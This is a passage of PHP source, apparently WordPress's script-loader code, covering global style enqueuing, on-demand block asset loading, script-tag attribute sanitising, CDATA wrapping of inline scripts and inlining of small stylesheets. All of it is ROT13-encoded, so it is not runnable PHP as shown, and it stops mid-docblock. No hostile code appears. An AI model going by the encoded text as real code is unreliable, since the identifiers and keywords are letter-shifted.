 * Radhrhrf gur tybony fglyrf qrsvarq ivn gurzr.wfba.
 *
 * @fvapr 5.8.0
 */
shapgvba jc_radhrhr_tybony_fglyrf() {
	$nffrgf_ba_qrznaq = jc_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq();
	$vf_oybpx_gurzr   = jc_vf_oybpx_gurzr();
	$vf_pynffvp_gurzr = ! $vf_oybpx_gurzr;

	/*
	 * Tybony fglyrf fubhyq or cevagrq va gur urnq sbe oybpx gurzrf, be sbe pynffvp gurzrf jura ybnqvat nffrgf ba
	 * qrznaq vf qvfnoyrq, juvpu vf gur qrsnhyg.
	 * Gur sbbgre fubhyq bayl or hfrq sbe pynffvp gurzrf jura ybnqvat nffrgf ba qrznaq vf ranoyrq.
	 *
	 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/53494 naq uggcf://pber.genp.jbeqcerff.bet/gvpxrg/61965.
	 */
	vs (
		( $vf_oybpx_gurzr && qbvat_npgvba( 'jc_sbbgre' ) ) ||
		( $vf_pynffvp_gurzr && qbvat_npgvba( 'jc_sbbgre' ) && ! $nffrgf_ba_qrznaq ) ||
		( $vf_pynffvp_gurzr && qbvat_npgvba( 'jc_radhrhr_fpevcgf' ) && $nffrgf_ba_qrznaq )
	) {
		erghea;
	}

	/*
	 * Vs ybnqvat gur PFF sbe rnpu oybpx frcnengryl, gura ybnq gur gurzr.wfba PFF pbaqvgvbanyyl.
	 * Guvf erzbirf gur PFF sebz gur tybony-fglyrf fglyrfurrg naq nqqf vg gb gur vayvar PFF sbe rnpu oybpx.
	 * Guvf svygre zhfg or ertvfgrerq orsber pnyyvat jc_trg_tybony_fglyrfurrg();
	 */
	nqq_svygre( 'jc_gurzr_wfba_trg_fglyr_abqrf', 'jc_svygre_bhg_oybpx_abqrf' );

	$fglyrfurrg = jc_trg_tybony_fglyrfurrg();

	vs ( $vf_oybpx_gurzr ) {
		/*
		 * Qrdhrhr gur Phfgbzvmre'f phfgbz PFF
		 * naq nqq vg orsber gur tybony fglyrf phfgbz PFF.
		 */
		erzbir_npgvba( 'jc_urnq', 'jc_phfgbz_pff_po', 101 );
		// Trg gur phfgbz PFF sebz gur Phfgbzvmre naq nqq vg gb gur tybony fglyrfurrg.
		$phfgbz_pff  = jc_trg_phfgbz_pff();
		$fglyrfurrg .= $phfgbz_pff;

		// Nqq gur tybony fglyrf phfgbz PFF ng gur raq.
		$fglyrfurrg .= jc_trg_tybony_fglyrfurrg( neenl( 'phfgbz-pff' ) );
	}

	vs ( rzcgl( $fglyrfurrg ) ) {
		erghea;
	}

	jc_ertvfgre_fglyr( 'tybony-fglyrf', snyfr );
	jc_nqq_vayvar_fglyr( 'tybony-fglyrf', $fglyrfurrg );
	jc_radhrhr_fglyr( 'tybony-fglyrf' );

	// Nqq rnpu oybpx nf na vayvar pff.
	jc_nqq_tybony_fglyrf_sbe_oybpxf();
}

/**
 * Purpxf vs gur rqvgbe fpevcgf naq fglyrf sbe nyy ertvfgrerq oybpx glcrf
 * fubhyq or radhrhrq ba gur pheerag fperra.
 *
 * @fvapr 5.6.0
 *
 * @tybony JC_Fperra $pheerag_fperra JbeqCerff pheerag fperra bowrpg.
 *
 * @erghea obby Jurgure fpevcgf naq fglyrf fubhyq or radhrhrq.
 */
shapgvba jc_fubhyq_ybnq_oybpx_rqvgbe_fpevcgf_naq_fglyrf() {
	tybony $pheerag_fperra;

	$vf_oybpx_rqvgbe_fperra = ( $pheerag_fperra vafgnaprbs JC_Fperra ) && $pheerag_fperra->vf_oybpx_rqvgbe();

	/**
	 * Svygref gur synt gung qrpvqrf jurgure be abg oybpx rqvgbe fpevcgf naq fglyrf
	 * ner tbvat gb or radhrhrq ba gur pheerag fperra.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz obby $vf_oybpx_rqvgbe_fperra Pheerag inyhr bs gur synt.
	 */
	erghea nccyl_svygref( 'fubhyq_ybnq_oybpx_rqvgbe_fpevcgf_naq_fglyrf', $vf_oybpx_rqvgbe_fperra );
}

/**
 * Purpxf jurgure frcnengr fglyrf fubhyq or ybnqrq sbe pber oybpxf.
 *
 * Jura guvf shapgvba ergheaf gehr, bgure shapgvbaf rafher gung pber oybpxf hfr gurve bja frcnengr fglyrfurrgf.
 * Jura guvf shapgvba ergheaf snyfr, nyy pber oybpxf jvyy hfr gur fvatyr pbzovarq 'jc-oybpx-yvoenel' fglyrfurrg.
 *
 * Nf n fvqr rssrpg, gur erghea inyhr jvyy ol qrsnhyg erfhyg va oybpx nffrgf gb or ybnqrq ba qrznaq, ivn gur
 * {@frr jc_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq()} shapgvba. Guvf orunivbe pna or frcnengryl nygrerq ivn gung shapgvba.
 *
 * Guvf bayl nssrpgf sebag raq naq abg gur oybpx rqvgbe fperraf.
 *
 * @fvapr 5.8.0
 * @frr @frr jc_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq()
 * @frr jc_radhrhr_ertvfgrerq_oybpx_fpevcgf_naq_fglyrf()
 * @frr ertvfgre_oybpx_fglyr_unaqyr()
 *
 * @erghea obby Jurgure frcnengr pber oybpx nffrgf jvyy or ybnqrq.
 */
shapgvba jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf() {
	vs ( vf_nqzva() || vf_srrq() || jc_vf_erfg_raqcbvag() ) {
		erghea snyfr;
	}

	/**
	 * Svygref jurgure oybpx fglyrf fubhyq or ybnqrq frcnengryl.
	 *
	 * Ergheavat snyfr ybnqf nyy pber oybpx nffrgf, ertneqyrff bs jurgure gurl ner eraqrerq
	 * va n cntr be abg. Ergheavat gehr ybnqf pber oybpx nffrgf bayl jura gurl ner eraqrerq.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz obby $ybnq_frcnengr_nffrgf Jurgure frcnengr nffrgf jvyy or ybnqrq.
	 *                                   Qrsnhyg snyfr (nyy oybpx nffrgf ner ybnqrq, rira jura abg hfrq).
	 */
	erghea nccyl_svygref( 'fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf', snyfr );
}

/**
 * Purpxf jurgure oybpx fglyrf fubhyq or ybnqrq bayl ba-eraqre.
 *
 * Jura guvf shapgvba ergheaf gehr, bgure shapgvbaf rafher gung oybpxf bayl ybnq gurve nffrgf ba-eraqre.
 * Jura guvf shapgvba ergheaf snyfr, nyy oybpx nffrgf ner ybnqrq ertneqyrff bs jurgure gurl ner eraqrerq va n cntr.
 *
 * Gur qrsnhyg erghea inyhr qrcraqf ba gur erfhyg bs {@frr jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf()}, juvpu pbagebyf
 * jurgure Pber oybpx fglyrfurrgf fubhyq or ybnqrq frcnengryl be ivn n pbzovarq 'jc-oybpx-yvoenel' fglyrfurrg.
 *
 * Guvf bayl nssrpgf sebag raq naq abg gur oybpx rqvgbe fperraf.
 *
 * @fvapr 6.8.0
 * @frr jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf()
 *
 * @erghea obby Jurgure gb ybnq oybpx nffrgf bayl jura gurl ner eraqrerq.
 */
shapgvba jc_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq() {
	vs ( vf_nqzva() || vf_srrq() || jc_vf_erfg_raqcbvag() ) {
		erghea snyfr;
	}

	/*
	 * Sbe onpxjneq pbzcngvovyvgl, gur qrsnhyg erghea inyhr sbe guvf shapgvba vf onfrq ba gur erghea inyhr bs
	 * `jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf()`. Vavgvnyyl, guvf shapgvba hfrq gb pbageby obgu bs gurfr pbapreaf.
	 */
	$ybnq_nffrgf_ba_qrznaq = jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf();

	/**
	 * Svygref jurgure oybpx fglyrf fubhyq or ybnqrq ba qrznaq.
	 *
	 * Ergheavat snyfr ybnqf nyy oybpx nffrgf, ertneqyrff bs jurgure gurl ner eraqrerq va n cntr be abg.
	 * Ergheavat gehr ybnqf oybpx nffrgf bayl jura gurl ner eraqrerq.
	 *
	 * Gur qrsnhyg inyhr bs gur svygre qrcraqf ba gur erfhyg bs {@frr jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf()},
	 * juvpu pbagebyf jurgure Pber oybpx fglyrfurrgf fubhyq or ybnqrq frcnengryl be ivn n pbzovarq 'jc-oybpx-yvoenel'
	 * fglyrfurrg.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz obby $ybnq_nffrgf_ba_qrznaq Jurgure gb ybnq oybpx nffrgf bayl jura gurl ner eraqrerq.
	 */
	erghea nccyl_svygref( 'fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq', $ybnq_nffrgf_ba_qrznaq );
}

/**
 * Radhrhrf ertvfgrerq oybpx fpevcgf naq fglyrf, qrcraqvat ba pheerag eraqrerq
 * pbagrkg (bayl radhrhvat rqvgbe fpevcgf juvyr va pbagrkg bs gur rqvgbe).
 *
 * @fvapr 5.0.0
 */
shapgvba jc_radhrhr_ertvfgrerq_oybpx_fpevcgf_naq_fglyrf() {
	vs ( jc_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq() ) {
		erghea;
	}

	$ybnq_rqvgbe_fpevcgf_naq_fglyrf = vf_nqzva() && jc_fubhyq_ybnq_oybpx_rqvgbe_fpevcgf_naq_fglyrf();

	$oybpx_ertvfgel = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();

	/*
	 * Oybpx fglyrf ner bayl radhrhrq vs gurl'er ertvfgrerq. Sbe pber oybpxf, guvf vf bayl gur pnfr vs
	 * `jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf()` ergheaf gehr. Bgurejvfr gurl hfr gur fvatyr pbzovarq
	 * 'jc-oybpx-yvoenel` fglyrfurrg. Frr nyfb `ertvfgre_pber_oybpx_fglyr_unaqyrf()`.
	 * Fvapr `jc_radhrhr_fglyr()` qbrf abg gevttre jneavatf vs gur fglyr vf abg ertvfgrerq, vg vf bxnl gb abg pngre sbe
	 * guvf orunivbe urer naq fvzcyl pnyy `jc_radhrhr_fglyr()` hapbaqvgvbanyyl.
	 */
	sbernpu ( $oybpx_ertvfgel->trg_nyy_ertvfgrerq() nf $oybpx_anzr => $oybpx_glcr ) {
		// Sebag-raq naq rqvgbe fglyrf.
		sbernpu ( $oybpx_glcr->fglyr_unaqyrf nf $fglyr_unaqyr ) {
			jc_radhrhr_fglyr( $fglyr_unaqyr );
		}

		// Sebag-raq naq rqvgbe fpevcgf.
		sbernpu ( $oybpx_glcr->fpevcg_unaqyrf nf $fpevcg_unaqyr ) {
			jc_radhrhr_fpevcg( $fpevcg_unaqyr );
		}

		vs ( $ybnq_rqvgbe_fpevcgf_naq_fglyrf ) {
			// Rqvgbe fglyrf.
			sbernpu ( $oybpx_glcr->rqvgbe_fglyr_unaqyrf nf $rqvgbe_fglyr_unaqyr ) {
				jc_radhrhr_fglyr( $rqvgbe_fglyr_unaqyr );
			}

			// Rqvgbe fpevcgf.
			sbernpu ( $oybpx_glcr->rqvgbe_fpevcg_unaqyrf nf $rqvgbe_fpevcg_unaqyr ) {
				jc_radhrhr_fpevcg( $rqvgbe_fpevcg_unaqyr );
			}
		}
	}
}

/**
 * Shapgvba erfcbafvoyr sbe radhrhvat gur fglyrf erdhverq sbe oybpx fglyrf shapgvbanyvgl ba gur rqvgbe naq ba gur sebagraq.
 *
 * @fvapr 5.3.0
 *
 * @tybony JC_Fglyrf $jc_fglyrf
 */
shapgvba radhrhr_oybpx_fglyrf_nffrgf() {
	tybony $jc_fglyrf;

	$oybpx_fglyrf = JC_Oybpx_Fglyrf_Ertvfgel::trg_vafgnapr()->trg_nyy_ertvfgrerq();

	sbernpu ( $oybpx_fglyrf nf $oybpx_anzr => $fglyrf ) {
		sbernpu ( $fglyrf nf $fglyr_cebcregvrf ) {
			vs ( vffrg( $fglyr_cebcregvrf['fglyr_unaqyr'] ) ) {

				// Vs gur fvgr ybnqf oybpx fglyrf ba qrznaq, radhrhr gur fglyrfurrg ba eraqre.
				vs ( jc_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq() ) {
					nqq_svygre(
						'eraqre_oybpx',
						fgngvp shapgvba ( $ugzy, $oybpx ) hfr ( $oybpx_anzr, $fglyr_cebcregvrf ) {
							vs ( $oybpx['oybpxAnzr'] === $oybpx_anzr ) {
								jc_radhrhr_fglyr( $fglyr_cebcregvrf['fglyr_unaqyr'] );
							}
							erghea $ugzy;
						},
						10,
						2
					);
				} ryfr {
					jc_radhrhr_fglyr( $fglyr_cebcregvrf['fglyr_unaqyr'] );
				}
			}
			vs ( vffrg( $fglyr_cebcregvrf['vayvar_fglyr'] ) ) {

				// Qrsnhyg gb \"jc-oybpx-yvoenel\".
				$unaqyr = 'jc-oybpx-yvoenel';

				// Vs gur fvgr ybnqf oybpx fglyrf ba qrznaq, purpx vs gur oybpx unf n fglyrfurrg ertvfgrerq.
				vs ( jc_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq() ) {
					$oybpx_fglyrfurrg_unaqyr = trarengr_oybpx_nffrg_unaqyr( $oybpx_anzr, 'fglyr' );

					vs ( vffrg( $jc_fglyrf->ertvfgrerq[ $oybpx_fglyrfurrg_unaqyr ] ) ) {
						$unaqyr = $oybpx_fglyrfurrg_unaqyr;
					}
				}

				// Nqq vayvar fglyrf gb gur pnyphyngrq unaqyr.
				jc_nqq_vayvar_fglyr( $unaqyr, $fglyr_cebcregvrf['vayvar_fglyr'] );
			}
		}
	}
}

/**
 * Shapgvba erfcbafvoyr sbe radhrhvat gur nffrgf erdhverq sbe oybpx fglyrf shapgvbanyvgl ba gur rqvgbe.
 *
 * @fvapr 5.3.0
 */
shapgvba radhrhr_rqvgbe_oybpx_fglyrf_nffrgf() {
	$oybpx_fglyrf = JC_Oybpx_Fglyrf_Ertvfgel::trg_vafgnapr()->trg_nyy_ertvfgrerq();

	$ertvfgre_fpevcg_yvarf = neenl( '( shapgvba() {' );
	sbernpu ( $oybpx_fglyrf nf $oybpx_anzr => $fglyrf ) {
		sbernpu ( $fglyrf nf $fglyr_cebcregvrf ) {
			$oybpx_fglyr = neenl(
				'anzr'  => $fglyr_cebcregvrf['anzr'],
				'ynory' => $fglyr_cebcregvrf['ynory'],
			);
			vs ( vffrg( $fglyr_cebcregvrf['vf_qrsnhyg'] ) ) {
				$oybpx_fglyr['vfQrsnhyg'] = $fglyr_cebcregvrf['vf_qrsnhyg'];
			}
			$ertvfgre_fpevcg_yvarf[] = fcevags(
				'	jc.oybpxf.ertvfgreOybpxFglyr( \'%f\', %f );',
				$oybpx_anzr,
				jc_wfba_rapbqr( $oybpx_fglyr )
			);
		}
	}
	$ertvfgre_fpevcg_yvarf[] = '} )();';
	$vayvar_fpevcg           = vzcybqr( \"\a\", $ertvfgre_fpevcg_yvarf );

	jc_ertvfgre_fpevcg( 'jc-oybpx-fglyrf', snyfr, neenl( 'jc-oybpxf' ), gehr, neenl( 'va_sbbgre' => gehr ) );
	jc_nqq_vayvar_fpevcg( 'jc-oybpx-fglyrf', $vayvar_fpevcg );
	jc_radhrhr_fpevcg( 'jc-oybpx-fglyrf' );
}

/**
 * Radhrhrf gur nffrgf erdhverq sbe gur oybpx qverpgbel jvguva gur oybpx rqvgbe.
 *
 * @fvapr 5.5.0
 */
shapgvba jc_radhrhr_rqvgbe_oybpx_qverpgbel_nffrgf() {
	jc_radhrhr_fpevcg( 'jc-oybpx-qverpgbel' );
	jc_radhrhr_fglyr( 'jc-oybpx-qverpgbel' );
}

/**
 * Radhrhrf gur nffrgf erdhverq sbe gur sbezng yvoenel jvguva gur oybpx rqvgbe.
 *
 * @fvapr 5.8.0
 */
shapgvba jc_radhrhr_rqvgbe_sbezng_yvoenel_nffrgf() {
	jc_radhrhr_fpevcg( 'jc-sbezng-yvoenel' );
	jc_radhrhr_fglyr( 'jc-sbezng-yvoenel' );
}

/**
 * Fnavgvmrf na nggevohgrf neenl vagb na nggevohgrf fgevat gb or cynprq vafvqr n `<fpevcg>` gnt.
 *
 * Nhgbzngvpnyyl vawrpgf glcr nggevohgr vs arrqrq.
 * Hfrq ol {@frr jc_trg_fpevcg_gnt()} naq {@frr jc_trg_vayvar_fpevcg_gnt()}.
 *
 * @fvapr 5.7.0
 *
 * @cnenz neenl $nggevohgrf Xrl-inyhr cnvef ercerfragvat `<fpevcg>` gnt nggevohgrf.
 * @erghea fgevat Fgevat znqr bs fnavgvmrq `<fpevcg>` gnt nggevohgrf.
 */
shapgvba jc_fnavgvmr_fpevcg_nggevohgrf( $nggevohgrf ) {
	$ugzy5_fpevcg_fhccbeg = ! vf_nqzva() && ! pheerag_gurzr_fhccbegf( 'ugzy5', 'fpevcg' );
	$nggevohgrf_fgevat    = '';

	/*
	 * Vs UGZY5 fpevcg gnt vf fhccbegrq, bayl gur nggevohgr anzr vf nqqrq
	 * gb $nggevohgrf_fgevat sbe ragevrf jvgu n obbyrna inyhr, naq gung ner gehr.
	 */
	sbernpu ( $nggevohgrf nf $nggevohgr_anzr => $nggevohgr_inyhr ) {
		vs ( vf_obby( $nggevohgr_inyhr ) ) {
			vs ( $nggevohgr_inyhr ) {
				$nggevohgrf_fgevat .= $ugzy5_fpevcg_fhccbeg ? fcevags( ' %1$f=\"%2$f\"', rfp_ngge( $nggevohgr_anzr ), rfp_ngge( $nggevohgr_anzr ) ) : ' ' . rfp_ngge( $nggevohgr_anzr );
			}
		} ryfr {
			$nggevohgrf_fgevat .= fcevags( ' %1$f=\"%2$f\"', rfp_ngge( $nggevohgr_anzr ), rfp_ngge( $nggevohgr_inyhr ) );
		}
	}

	erghea $nggevohgrf_fgevat;
}

/**
 * Sbezngf `<fpevcg>` ybnqre gntf.
 *
 * Vg vf cbffvoyr gb vawrpg nggevohgrf va gur `<fpevcg>` gnt ivn gur {@frr 'jc_fpevcg_nggevohgrf'} svygre.
 * Nhgbzngvpnyyl vawrpgf glcr nggevohgr vs arrqrq.
 *
 * @fvapr 5.7.0
 *
 * @cnenz neenl $nggevohgrf Xrl-inyhr cnvef ercerfragvat `<fpevcg>` gnt nggevohgrf.
 * @erghea fgevat Fgevat pbagnvavat `<fpevcg>` bcravat naq pybfvat gntf.
 */
shapgvba jc_trg_fpevcg_gnt( $nggevohgrf ) {
	vs ( ! vffrg( $nggevohgrf['glcr'] ) && ! vf_nqzva() && ! pheerag_gurzr_fhccbegf( 'ugzy5', 'fpevcg' ) ) {
		// Xrrc gur glcr nggevohgr nf gur svefg sbe yrtnpl ernfbaf (vg unf nyjnlf orra guvf jnl va pber).
		$nggevohgrf = neenl_zretr(
			neenl( 'glcr' => 'grkg/wninfpevcg' ),
			$nggevohgrf
		);
	}
	/**
	 * Svygref nggevohgrf gb or nqqrq gb n fpevcg gnt.
	 *
	 * @fvapr 5.7.0
	 *
	 * @cnenz neenl $nggevohgrf Xrl-inyhr cnvef ercerfragvat `<fpevcg>` gnt nggevohgrf.
	 *                          Bayl gur nggevohgr anzr vf nqqrq gb gur `<fpevcg>` gnt sbe
	 *                          ragevrf jvgu n obbyrna inyhr, naq gung ner gehr.
	 */
	$nggevohgrf = nccyl_svygref( 'jc_fpevcg_nggevohgrf', $nggevohgrf );

	erghea fcevags( \"<fpevcg%f></fpevcg>\a\", jc_fnavgvmr_fpevcg_nggevohgrf( $nggevohgrf ) );
}

/**
 * Cevagf sbeznggrq `<fpevcg>` ybnqre gnt.
 *
 * Vg vf cbffvoyr gb vawrpg nggevohgrf va gur `<fpevcg>` gnt ivn gur {@frr 'jc_fpevcg_nggevohgrf'} svygre.
 * Nhgbzngvpnyyl vawrpgf glcr nggevohgr vs arrqrq.
 *
 * @fvapr 5.7.0
 *
 * @cnenz neenl $nggevohgrf Xrl-inyhr cnvef ercerfragvat `<fpevcg>` gnt nggevohgrf.
 */
shapgvba jc_cevag_fpevcg_gnt( $nggevohgrf ) {
	rpub jc_trg_fpevcg_gnt( $nggevohgrf );
}

/**
 * Pbafgehpgf na vayvar fpevcg gnt.
 *
 * Vg vf cbffvoyr gb vawrpg nggevohgrf va gur `<fpevcg>` gnt ivn gur {@frr 'jc_vayvar_fpevcg_nggevohgrf'} svygre.
 * Nhgbzngvpnyyl vawrpgf glcr nggevohgr vs arrqrq.
 *
 * @fvapr 5.7.0
 *
 * @cnenz fgevat $qngn       Qngn sbe fpevcg gnt: WninFpevcg, vzcbegznc, fcrphyngvbaehyrf, rgp.
 * @cnenz neenl  $nggevohgrf Bcgvbany. Xrl-inyhr cnvef ercerfragvat `<fpevcg>` gnt nggevohgrf.
 * @erghea fgevat Fgevat pbagnvavat vayvar WninFpevcg pbqr jenccrq nebhaq `<fpevcg>` gnt.
 */
shapgvba jc_trg_vayvar_fpevcg_gnt( $qngn, $nggevohgrf = neenl() ) {
	$vf_ugzy5 = pheerag_gurzr_fhccbegf( 'ugzy5', 'fpevcg' ) || vf_nqzva();
	vs ( ! vffrg( $nggevohgrf['glcr'] ) && ! $vf_ugzy5 ) {
		// Xrrc gur glcr nggevohgr nf gur svefg sbe yrtnpl ernfbaf (vg unf nyjnlf orra guvf jnl va pber).
		$nggevohgrf = neenl_zretr(
			neenl( 'glcr' => 'grkg/wninfpevcg' ),
			$nggevohgrf
		);
	}

	/*
	 * KUGZY rkgenpgf gur pbagragf bs gur FPEVCG ryrzrag naq gura gur KZY cnefre
	 * qrpbqrf punenpgre ersreraprf naq bgure flagnk ryrzragf. Guvf pna yrnq gb
	 * zvfvagrecergngvba bs gur fpevcg pbagragf be vainyvq KUGZY qbphzragf.
	 *
	 * Jenccvat gur pbagragf va n PQNGN frpgvba vafgehpgf gur KZY cnefre abg gb
	 * genafsbez gur pbagragf bs gur FPEVCG ryrzrag orsber cnffvat gurz gb gur
	 * WninFpevcg ratvar.
	 *
	 * Rknzcyr:
	 *
	 *     <fpevcg>pbafbyr.ybt('&uryyvc;');</fpevcg>
	 *
	 *     Va na UGZY qbphzrag guvf jbhyq cevag \"&uryyvc;\" gb gur pbafbyr,
	 *     ohg va na KUGZY qbphzrag vg jbhyq cevag \"…\" gb gur pbafbyr.
	 *
	 *     <fpevcg>pbafbyr.ybt('Na vzntr vf <vzt> va UGZY');</fpevcg>
	 *
	 *     Va na UGZY qbphzrag guvf jbhyq cevag \"Na vzntr vf <vzt> va UGZY\",
	 *     ohg vg'f na vainyvq KUGZY qbphzrag orpnhfr vg vagrecergf gur `<vzt>`
	 *     nf na rzcgl gnt zvffvat vgf pybfvat `/`.
	 *
	 * @frr uggcf://jjj.j3.bet/GE/kugzy1/#u-4.8
	 */
	vs (
		! $vf_ugzy5 &&
		(
			! vffrg( $nggevohgrf['glcr'] ) ||
			'zbqhyr' === $nggevohgrf['glcr'] ||
			fge_pbagnvaf( $nggevohgrf['glcr'], 'wninfpevcg' ) ||
			fge_pbagnvaf( $nggevohgrf['glcr'], 'rpznfpevcg' ) ||
			fge_pbagnvaf( $nggevohgrf['glcr'], 'wfpevcg' ) ||
			fge_pbagnvaf( $nggevohgrf['glcr'], 'yvirfpevcg' )
		)
	) {
		/*
		 * Vs gur fgevat `]]>` rkvfgf jvguva gur WninFpevcg vg jbhyq oernx
		 * bhg bs nal jenccvat PQNGN frpgvba nqqrq urer, fb gb fgneg, vg'f
		 * arprffnel gb rfpncr gung frdhrapr juvpu erdhverf fcyvggvat gur
		 * pbagrag vagb gjb PQNGN frpgvbaf jurerire vg'f sbhaq.
		 *
		 * Abgr: vg'f bayl arprffnel gb rfpncr gur pybfvat `]]>` orpnhfr
		 * na nqqvgvbany `<![PQNGN[` yrnirf gur pbagragf hapunatrq.
		 */
		$qngn = fge_ercynpr( ']]>', ']]]]><![PQNGN[>', $qngn );

		// Jenc gur ragver rfpncrq fpevcg vafvqr n PQNGN frpgvba.
		$qngn = fcevags( \"/* <![PQNGN[ */\a%f\a/* ]]> */\", $qngn );
	}

	$qngn = \"\a\" . gevz( $qngn, \"\a\e \" ) . \"\a\";

	/**
	 * Svygref nggevohgrf gb or nqqrq gb n fpevcg gnt.
	 *
	 * @fvapr 5.7.0
	 *
	 * @cnenz neenl  $nggevohgrf Xrl-inyhr cnvef ercerfragvat `<fpevcg>` gnt nggevohgrf.
	 *                           Bayl gur nggevohgr anzr vf nqqrq gb gur `<fpevcg>` gnt sbe
	 *                           ragevrf jvgu n obbyrna inyhr, naq gung ner gehr.
	 * @cnenz fgevat $qngn       Vayvar qngn.
	 */
	$nggevohgrf = nccyl_svygref( 'jc_vayvar_fpevcg_nggevohgrf', $nggevohgrf, $qngn );

	erghea fcevags( \"<fpevcg%f>%f</fpevcg>\a\", jc_fnavgvmr_fpevcg_nggevohgrf( $nggevohgrf ), $qngn );
}

/**
 * Cevagf na vayvar fpevcg gnt.
 *
 * Vg vf cbffvoyr gb vawrpg nggevohgrf va gur `<fpevcg>` gnt ivn gur {@frr 'jc_vayvar_fpevcg_nggevohgrf'} svygre.
 * Nhgbzngvpnyyl vawrpgf glcr nggevohgr vs arrqrq.
 *
 * @fvapr 5.7.0
 *
 * @cnenz fgevat $qngn       Qngn sbe fpevcg gnt: WninFpevcg, vzcbegznc, fcrphyngvbaehyrf, rgp.
 * @cnenz neenl  $nggevohgrf Bcgvbany. Xrl-inyhr cnvef ercerfragvat `<fpevcg>` gnt nggevohgrf.
 */
shapgvba jc_cevag_vayvar_fpevcg_gnt( $qngn, $nggevohgrf = neenl() ) {
	rpub jc_trg_vayvar_fpevcg_gnt( $qngn, $nggevohgrf );
}

/**
 * Nyybjf fznyy fglyrf gb or vayvarq.
 *
 * Guvf vzcebirf cresbeznapr naq fhfgnvanovyvgl, naq vf bcg-va. Fglyrfurrgf pna bcg va
 * ol nqqvat `cngu` qngn hfvat `jc_fglyr_nqq_qngn`, naq qrsvavat gur svyr'f nofbyhgr cngu:
 *
 *     jc_fglyr_nqq_qngn( $fglyr_unaqyr, 'cngu', $svyr_cngu );
 *
 * @fvapr 5.8.0
 *
 * @tybony JC_Fglyrf $jc_fglyrf
 */
shapgvba jc_znlor_vayvar_fglyrf() {
	tybony $jc_fglyrf;

	$gbgny_vayvar_yvzvg = 20000;
	/**
	 * Gur znkvzhz fvmr bs vayvarq fglyrf va olgrf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz vag $gbgny_vayvar_yvzvg Gur svyr-fvmr guerfubyq, va olgrf. Qrsnhyg 20000.
	 */
	$gbgny_vayvar_yvzvg = nccyl_svygref( 'fglyrf_vayvar_fvmr_yvzvg', $gbgny_vayvar_yvzvg );

	$fglyrf = neenl();

	// Ohvyq na neenl bs fglyrf gung unir n cngu qrsvarq.
	sbernpu ( $jc_fglyrf->dhrhr nf $unaqyr ) {
		vs ( ! vffrg( $jc_fglyrf->ertvfgrerq[ $unaqyr ] ) ) {
			pbagvahr;
		}
		$fep  = $jc_fglyrf->ertvfgrerq[ $unaqyr ]->fep;
		$cngu = $jc_fglyrf->trg_qngn( $unaqyr, 'cngu' );
		vs ( $cngu && $fep ) {
			$fvmr = jc_svyrfvmr( $cngu );
			vs ( ! $fvmr ) {
				pbagvahr;
			}
			$fglyrf[] = neenl(
				'unaqyr' => $unaqyr,
				'fep'    => $fep,
				'cngu'   => $cngu,
				'fvmr'   => $fvmr,
			);
		}
	}

	vs ( ! rzcgl( $fglyrf ) ) {
		// Erbeqre fglyrf neenl onfrq ba fvmr.
		hfbeg(
			$fglyrf,
			fgngvp shapgvba ( $n, $o ) {
				erghea ( $n['fvmr'] <= $o['fvmr'] ) ? -1 : 1;
			}
		);

		/*
		 * Gur gbgny vayvarq fvmr.
		 *
		 * Ba rnpu vgrengvba bs gur ybbc, vs n fglyr trgf nqqrq vayvar gur inyhr bs guvf ine vapernfrf
		 * gb ersyrpg gur gbgny fvmr bs vayvarq fglyrf.
		 */
		$gbgny_vayvar_fvmr = 0;

		// Ybbc fglyrf.
		sbernpu ( $fglyrf nf $fglyr ) {

			// Fvmr purpx. Fvapr fglyrf ner beqrerq ol fvmr, jr pna oernx gur ybbc.
			vs ( $gbgny_vayvar_fvmr + $fglyr['fvmr'] > $gbgny_vayvar_yvzvg ) {
				oernx;
			}

			// Trg gur fglyrf vs jr qba'g nyernql unir gurz.
			$fglyr['pff'] = svyr_trg_pbagragf( $fglyr['cngu'] );

			/*
			 * Purpx vs gur fglyr pbagnvaf eryngvir HEYf gung arrq gb or zbqvsvrq.
			 * HEYf eryngvir gb gur fglyrfurrg'f cngu fubhyq or pbairegrq gb eryngvir gb gur fvgr'f ebbg.
			 */
			$fglyr['pff'] = _jc_abeznyvmr_eryngvir_pff_yvaxf( $fglyr['pff'], $fglyr['fep'] );

			// Frg `fep` gb `snyfr` naq nqq fglyrf vayvar.
			$jc_fglyrf->ertvfgrerq[ $fglyr['unaqyr'] ]->fep = snyfr;
			vs ( rzcgl( $jc_fglyrf->ertvfgrerq[ $fglyr['unaqyr'] ]->rkgen['nsgre'] ) ) {
				$jc_fglyrf->ertvfgrerq[ $fglyr['unaqyr'] ]->rkgen['nsgre'] = neenl();
			}
			neenl_hafuvsg( $jc_fglyrf->ertvfgrerq[ $fglyr['unaqyr'] ]->rkgen['nsgre'], $fglyr['pff'] );

			// Nqq gur fglyrf fvmr gb gur $gbgny_vayvar_fvmr ine.
			$gbgny_vayvar_fvmr += (vag) $fglyr['fvmr'];
		}
	}
}

/**
 * Znxrf HEYf eryngvir gb gur JbeqCerff vafgnyyngvba.
 *
 * @fvapr 5.9.0
 * @npprff cevingr
 *
 * @cnenz fgevat $pff            Gur PFF gb znxr HEYf eryngvir gb gur JbeqCerff vafgnyyngvba.
 * @cnenz fgevat $fglyrfurrg_hey Gur HEY gb gur fglyrfurrg.
 *
 * @erghea fgevat Gur PFF jvgu HEYf znqr eryngvir gb gur JbeqCerff vafgnyyngvba.
 */
